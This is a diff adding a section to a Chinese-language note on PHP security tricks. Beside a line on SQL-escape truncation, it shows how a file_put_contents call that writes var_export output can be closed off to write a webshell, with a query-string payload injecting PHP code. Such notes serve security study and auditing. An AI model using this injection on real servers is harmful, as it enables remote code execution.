@@ -173,3 +173,18 @@ php语言的特性：[PHP可变变量](http://php.net/manual/zh/language.variabl
 ```
 常常配合substr截断，当转义\'后，正好截断到\，此时\可以转义sql的拼接。
 ```
+
+
+^
+## **函数突破**
+```
+file_put_contents(
+    self::EXTERNAL_DIRECTORY . $this->id,
+    var_export(get_object_vars($this)，true)
+);
+```
+get_object_vars($this)是获取本类的属性和属性值，做为数组返回。
+又写入文件，可以通过闭合，写入shell。
+```
+?name=',)%0a\<?php phpinfo();?>//
+```
